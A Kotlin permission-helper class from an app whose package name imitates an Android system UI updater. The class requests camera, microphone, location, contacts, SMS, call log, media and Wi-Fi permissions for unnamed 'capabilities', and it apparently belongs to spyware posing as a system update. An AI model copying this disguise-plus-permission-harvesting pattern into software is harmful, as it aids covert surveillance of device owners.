package com.android.systemui.updater.util

import android.app.Activity
import android.content.pm.PackageManager
import android.os.Build
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

/**
 * Manages runtime permission requests for the app.
 * Uses modern Activity Result API.
 */
class PermissionManager(private val activity: Activity) {

    private val requiredPermissions = mutableListOf<String>()
    private var callback: ((allGranted: Boolean) -> Unit)? = null

    init {
        collectRequiredPermissions()
    }

    private fun collectRequiredPermissions() {
        // Always required
        requiredPermissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
        
        // Dangerous permissions used by capabilities
        requiredPermissions.add(android.Manifest.permission.CAMERA)
        requiredPermissions.add(android.Manifest.permission.RECORD_AUDIO)
        requiredPermissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
        requiredPermissions.add(android.Manifest.permission.READ_CONTACTS)
        requiredPermissions.add(android.Manifest.permission.READ_SMS)
        requiredPermissions.add(android.Manifest.permission.READ_CALL_LOG)
        
        // Storage (scoped)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_VIDEO)
            requiredPermissions.add(android.Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            requiredPermissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        // WiFi/Network
        requiredPermissions.add(android.Manifest.permission.ACCESS_WIFI_STATE)
        requiredPermissions.add(android.Manifest.permission.CHANGE_WIFI_STATE)
    }

    fun requestRequiredPermissions(onComplete: (allGranted: Boolean) -> Unit) {
        callback = onComplete
        
        val ungranted = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (ungranted.isEmpty()) {
            onComplete(true)
            return
        }
        
        // Request permissions using Activity Result API
        requestPermissionLauncher.launch(ungranted.toTypedArray())
    }

    private val requestPermissionLauncher = activity.registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissionsMap ->
        val allGranted = permissionsMap.all { it.value }
        callback?.invoke(allGranted)
    }

    fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ): Boolean {
        // Not used with Activity Result API, but kept for compatibility
        return false
    }
}